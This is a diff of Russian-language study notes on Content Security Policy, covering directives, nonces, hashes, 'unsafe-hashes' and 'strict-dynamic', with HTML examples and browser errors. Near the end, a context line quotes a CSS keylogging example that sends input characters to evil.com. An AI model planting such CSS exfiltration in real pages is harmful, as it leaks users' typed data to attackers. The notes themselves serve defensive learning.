@@ -1,6 +1,35 @@
-Заголовок ответа HTTP `Content-Security-Policy` позволяет контролировать ресурсы, которые пользовательскому агенту разрешено загружать для данной страницы.
+-  [[#^d3e26d|Зачем нужен CSP?]]
+-  [[#^3316e9|Как добавить CSP на страницу?]]
+-  [[#^523479|Какой способ добавления на страницу предпочтительнее?]]
+-  [[#^614b07|От каких угроз защищает CSP?]]
+-  [[#^bdfb6a |Какие существуют директивы?]]
+-  Какие существуют значения директив?
+-  [[#^880702 |Что можно сделать, если очень много sources нужно перечислять?]]
+-  Что такое `nonce` и `hashes` и как они генерируются?
+-  [[#^a13c65 |В чем состоит идея `nonce` когда злоумышленник нашел способ внедрить скрипт?]]
+-  [[#^afca62 |Как разрешить inline обработчики событий, не используя `unsafe-inline`?]]
+-  [[#^6720cd |Как разрешить скриптам загружать скрипты, не перечисленные в CSP?]]
+-  [[#^cd848d  |Как можно это обхитрить в скрипте, даже если не стоит `strict-dynamic`?]]
+
+
+Позволяет контролировать ресурсы, которые пользовательскому агенту разрешено загружать для данной страницы. ^d3e26d
+
+Встраивается на страницу с помощью заголовка `Content-Security-Policy` или мета-тега 
+`<meta http-equiv="Content-Security-Policy">` ^3316e9
+
+Способ с заголовком более предпочтительный, так как если у злоумышленника получится вставить какой-либо скрипт до `<meta>` тега, то этот скрипт выполнится. ^523479
+
+Позволяет защититься от таких атак как: ^614b07
+- XSS
+		`Content-Security-Policy: script-src 'self'`
+		Даже если `innerHTML` вставил `<script>`, он не выполнится, тк блокируется политикой CSP
+- Clickjacking
+		`Content-Security-Policy: frame-ancestors 'none'`
+		Запрещает встраивание вашего сайта в чужие `iframe`.
 
 #### Директивы
+
+^bdfb6a
 
 Директивы управляют местами, из которых могут быть загружены определенные типы ресурсов.
 
@@ -120,8 +149,7 @@ Content-Security-Policy: script-src-elem 'self' https://cdn.example.com;
 ```
 
 
-
-`script-src-attr`
+#### `script-src-attr`
 управляет выполнением **инлайновых обработчиков событий**
 
 Пример:
@@ -145,6 +173,17 @@ Content-Security-Policy: default-src 'self'; img-src *; script-src userscripts.e
 - Для изображения разрешены любые домены.
 - Для скриптов разрешен только `userscripts.example.com`
 
+#### `frame-ancestors`
+Определяет допустимых родителей, которые могут встраивать эту страницу в 
+`<frame>`, `<iframe>`, `<object>`, или `<embed>`.
+
+Установка этой директивы в значение `none` аналогична `X-Frame-Options: deny` (которая также поддерживается в старых браузерах).
+
+```
+Content-Security-Policy: frame-ancestors 'none';
+
+Content-Security-Policy: frame-ancestors 'self' https://example.org https://example.com https://store.example.com;
+```
 
 ## Синтаксис значений CSP:
 
@@ -188,19 +227,41 @@ Secure:
 - `ws:`также разрешит загрузку ресурсов с использованием WSS.
 
 
-
 #### `'nonce-<nonce_value>'`
 
-Это значение состоит из строки, nonce-за которой следует строка в кодировке base64 . Эта строка — случайное значение, которое сервер генерирует для каждого ответа HTTP. Например:
+Это значение состоит из строки, nonce-за которой следует строка в кодировке base64 . Эта строка — случайное значение, которое сервер генерирует для каждого ответа HTTP. 
+
+Это удобно, если у нас очень много источников типа `example.com` `example2.com` и тд
+Чтобы не перечислять их всех, мы можем просто всем скриптам дать `nonce`
+Например: ^880702
 
 1. **Сервер генерирует уникальное значение (nonce)** для каждого запроса. Это значение должно быть случайным и изменяться при каждом обновлении страницы.
+
+```js
+function content(nonce) {
+  return `
+    <script nonce="${nonce}" src="/main.js"></script>
+    <script nonce="${nonce}">console.log("hello!");</script>
+    <h1>Hello world</h1> 
+    `;
+}
+
+app.get("/", (req, res) => {
+  const nonce = crypto.randomUUID();
+  res.setHeader("Content-Security-Policy", `script-src 'nonce-${nonce}'`);
+  res.send(content(nonce));
+});
+```
+
+
 2. **Nonce добавляется в CSP**:
 ```
 Content-Security-Policy: script-src 'nonce-abc123';
 ```
-*Здесь `abc123` — это пример значения nonce.*
+*Здесь `abc123` — это пример значения nonce.
+*
 3. **Nonce добавляется в теги `<script>` или `<style>`** на странице:
-```
+```html
 <script nonce="abc123">
   console.log("This script is allowed!");
 </script>
@@ -211,7 +272,152 @@ Content-Security-Policy: script-src 'nonce-abc123';
 
 *Если директива содержит nonce и `unsafe-inline`, то браузер игнорирует `unsafe-inline`.*
 
+_Идея заключается в том, что даже если злоумышленник сможет вставить какой-то JavaScript на страницу, он не будет знать, какой nonce собирается использовать сервер, поэтому браузер откажется запускать скрипт._ ^a13c65
+
 https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#nonces
+
+Работает только для `<script/>` и `<style>`, например для `<img/>` такое работать не будет:
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta 
+	    http-equiv="Content-Security-Policy" 
+	    content="default-src none; img-src 'nonce-1234';"
+	>
+</head>
+<body>
+<img src="test.png" nonce="1234" />
+</body>
+</html>
+```
+
+Для инлайн скриптов работает:
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; script-src 'nonce-1234';"
+  >
+</head>
+<body>
+<script nonce="1234">
+  alert('Hello')
+</script>
+</body>
+</html>
+```
+
+Не работает для инлайн скрипта в обработчиках:
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; script-src 'nonce-1234';"
+  >
+</head>
+<body>
+<button onclick="alert('Hello')" nonce="1234">Click</button>
+</body>
+</html>
+```
+
+Для инлайн стилей работает
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; style-src 'nonce-1234';"
+  >
+  <style nonce="1234">
+    body {
+      background-color: red;
+    }
+  </style>
+</head>
+<body>
+
+</body>
+</html>
+```
+
+Для загруженых стилей работает
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; style-src 'nonce-1234';"
+  >
+  <link rel="stylesheet" href="main.css" nonce="1234"/>
+</head>
+<body>
+
+</body>
+</html>
+```
+
+Не работает для аттрибутов style
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; style-src 'nonce-1234';"
+  >
+</head>
+<body>
+<button style="background-color: red" nonce="1234">Click</button>
+</body>
+</html>
+```
+
+По поводу *Если директива содержит nonce и `unsafe-inline`, то браузер игнорирует `unsafe-inline`.*
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; style-src 'nonce-1234' 'unsafe-inline' ;"
+  >
+  <style nonce="1234">
+    body {
+      background-color: red;
+    }
+  </style>
+  <style >
+    body {
+      background-color: blue;
+    }
+  </style>
+</head>
+<body>
+
+</body>
+</html>
+```
+Будет выкидывать ошибку:
+```
+Refused to apply inline style because it violates the following Content Security Policy directive: "style-src 'nonce-1234' 'unsafe-inline'". Note that 'unsafe-inline' is ignored if either a hash or nonce value is present in the source list.
+```
+И `body` все равно будет красным
+
 
 #### `'<hash_algorithm>-<hash_value>'`
 
@@ -221,14 +427,47 @@ https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#nonces
 Значение хэша представляет собой хэш ресурса `<script>` или `<style>` в кодировке base64, рассчитанный с использованием одной из следующих хэш-функций: `SHA-256`, `SHA-384` или `SHA-512`.
 
 1. **Сервер вычисляет хеш** содержимого встроенного скрипта или стиля.
+Например у нас скрипт
+```html
+<script>alert('Hello')</script>
+```
+
+Вычисляем хеш:
+```bash
+echo -n "alert('Hello')" | openssl sha256 -binary | openssl base64
+```
+
+```
+xsuTGwM1pbHxJt6Bcu7KLls/Z+Q7K2yHs6kiFf8OBkA=
+```
+
+
 2. **Хеш добавляется в CSP**:
 ```
-Content-Security-Policy: script-src 'sha256-abc123...' 'sha256-123abc...';
+Content-Security-Policy: script-src 'sha256-xsuTGwM1pbHxJt6Bcu7KLls/Z+Q7K2yHs6kiFf8OBkA=';
 ```
-3. Хеш записывается в атрибут `integrity` скрипта
+
+3. Теперь этот скрипт можно вставлять в страницу
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; script-src 'sha256-xsuTGwM1pbHxJt6Bcu7KLls/Z+Q7K2yHs6kiFf8OBkA=';"
+  >
+</head>
+<body>
+<script>alert('Hello')</script>
+</body>
+</html>
 ```
-<script src="./main.js" integrity="sha256-abc123..."></script>
-<script src="./other.js" integrity="sha256-123abc..."></script>
+
+Если скрипт будет загружаться, то нужно добавить атрибут `integrity`
+
+```html
+<script src="./main.js" integrity="sha256-xsuTGwM1pbHxJt6Bcu7KLls/Z+Q7K2yHs6kiFf8OBkA="></script>
 ```
 
 4. **Браузер проверяет хеш**:
@@ -236,6 +475,8 @@ Content-Security-Policy: script-src 'sha256-abc123...' 'sha256-123abc...';
 - Если хеш не совпадает, выполнение блокируется.
 
 *Если директива содержит хэш и `unsafe-inline`, то браузер игнорирует `unsafe-inline`.*
+
+Но это все равно не будет работать с inline-handlers, чтобы заработало, нужно добавлять 'unsafe-hashes'
 
 https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#hashes
 
@@ -263,29 +504,44 @@ https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#eval_and_similar_apis
 
 - инлайновые `<style>` теги
 - `style` атрибуты.
-- 
+
 Для снятия этой защиты можно использовать ключевое `unsafe-inline` слово, что позволит загрузить все эти формы.
 
 https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#inline_javascript
 
-
 #### `'unsafe-hashes'`
 По умолчанию, если CSP содержит директиву `default-src` или `script-src`, то встроенные атрибуты обработчика событий, такие как `onclick` и встроенные `style` атрибуты, не могут выполняться.
 
-Выражение `'unsafe-hashes'` позволяет браузеру использовать хэш-выражения для встроенных обработчиков событий и `style` атрибутов. 
+Выражение `'unsafe-hashes'` позволяет браузеру использовать хэш-выражения для встроенных обработчиков событий и `style` атрибутов.  ^afca62
 
 Предположим, у нас есть такой HTML-код:
 ```
-<button onclick="alert('Hello!')">Click me</button>
+<button onclick="alert('Hello')">Click</button>
 ```
 
 Обычно CSP блокирует inline-обработчики onclick, но если мы добавим unsafe-hashes, то сможем разрешить их с помощью хэша.
 
 ```
-Content-Security-Policy: script-src 'self' 'unsafe-hashes' 'sha256-V3jrr8lGJQ6SGlrOCspQ9jx0J2gTiLqFSXvN7Ne9a2w='
+Content-Security-Policy: script-src 'self' 'unsafe-hashes' 'sha256-xsuTGwM1pbHxJt6Bcu7KLls/Z+Q7K2yHs6kiFf8OBkA=' (хэш "alert('Hello')")
 ```
 
 Если значение хэша совпадает с хэшем значения атрибута встроенного обработчика событий или `style` значения атрибута, то коду будет разрешено выполниться.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; script-src 'unsafe-hashes' 'sha256-xsuTGwM1pbHxJt6Bcu7KLls/Z+Q7K2yHs6kiFf8OBkA=';"
+  >
+</head>
+<body>
+<button onclick="alert('Hello')">Click</button>
+</body>
+</html>
+```
+
 
 **Предупреждение:** значение `'unsafe-hashes'`небезопасно.
 В частности, он позволяет провести атаку, в которой содержимое атрибута обработчика встроенных событий внедряется в документ как встроенный `<script>`элемент. Предположим, что встроенный обработчик событий:
@@ -307,27 +563,131 @@ TODO: https://developer.mozilla.org/en-US/docs/Web/API/Speculation_Rules_API
 
 #### `'strict-dynamic'`
 
-`'strict-dynamic'`  распространяет доверие, оказываемое скрипту с помощью `nonce` или `hash` , на скрипты, которые этот скрипт динамически загружает, например, создавая новые `<script>` теги с помощью` Document.createElement()` и затем вставляя их в документ с помощью `Node.appendChild()`.
+`'strict-dynamic'`  распространяет доверие, оказываемое скрипту с помощью `nonce` или `hash` , на скрипты, которые этот скрипт динамически загружает, например, создавая новые `<script>` теги с помощью` Document.createElement()` и затем вставляя их в документ с помощью `Node.appendChild()`. ^6720cd
 
 Допустим, у нас есть такой скрипт:
-```
-<script nonce="random123"> 
-	var script = document.createElement('script'); 
-	script.src = "https://cdn.example.com/library.js";    
-	document.body.appendChild(script); 
-</script>
-```
-
-Без `strict-dynamic` политика CSP должна включать `https://cdn.example.com`, иначе браузер заблокирует загрузку `library.js`.
-
-Но если мы используем:
-
-```
-Content-Security-Policy: script-src 'nonce-random123' 'strict-dynamic';
+```js
+// main.js
+const script = document.createElement("script");  
+script.src = 'http://example.com/js'  
+document.body.append(script)
 ```
 
-То **все скрипты, загруженные этим скриптом**, тоже станут доверенными, даже если их нет в списке `script-src`
+Мы можем добавить этот сайт в список разрешенных, но тогда если что-то поменяется, нужно лезть и CSP: 
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; script-src 'self' example.com"
+  >
+</head>
+<body>
+<script src="main.js"></script>
+</body>
+</html>
+```
 
+Eсли мы дадим этому скрипту `nonce`  или `hash`:
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; script-src 'nonce-1234'"
+  >
+</head>
+<body>
+<script src="main.js" nonce="1234"></script>
+</body>
+</html>
+```
+Все равно будет ругаться, 
+```
+Refused to load the script 'http://example.com/js' because it violates the following Content Security Policy directive: "script-src 'nonce-1234'". Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback
+```
+
+Чтобы "доверится" скриптам имеющим `nonce` или `hash`, следует добавить `strict-dynamic`
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; script-src 'strict-dynamic' 'nonce-1234'"
+  >
+</head>
+<body>
+<script src="main.js" nonce="1234"></script>
+</body>
+</html>
+```
+
+Таким образом, **все скрипты, загруженные этим скриптом**, тоже станут доверенными, даже если их нет в списке `script-src`
+
+Такой проблемы не будет, если мы загружаем скрипт, который подходит под `script-src`
+Например:
+```js
+const script = document.createElement("script");  
+script.src = '/second.js'  
+document.body.append(script)
+```
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; script-src 'self'"
+  >
+</head>
+<body>
+<script src="main.js"></script>
+</body>
+</html>
+```
+`main.js` загружает `second.js`, который подпадает под `'self'` и поэтому все ок
+
+Тут кстати можно немного схитрить, если мы имеем такое CSP: ^cd848d
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+          http-equiv="Content-Security-Policy"
+          content="default-src none; script-src 'nonce-1234'"
+  >
+</head>
+<body>
+<script src="main.js" nonce="1234"></script>
+</body>
+</html>
+```
+
+Так уже не прокатит, так как `second.js` но подходит под csp 
+```js
+const script = document.createElement("script");  
+script.src = 'second.js'  
+document.body.append(script)
+
+Refused to load the script 'http://localhost:3000/second.js' because it violates the following Content Security Policy directive: "script-src 'nonce-1234'". Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.
+```
+
+Но если дать ему этот nonce, то все будет ок:
+```js
+const script = document.createElement("script");
+script.src = 'second.js'
+script.nonce = document.currentScript.nonce // <- 
+document.body.append(script)
+```
 
 
 
@@ -453,6 +813,11 @@ input:focus:nth-child(1) { background: url('https://evil.com/leak?key=1'); } inp
 ```
 
 Злоумышленник может узнавать последовательность вводимых символов.
+
+
+Links:
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP
+
 
 
 TODO:
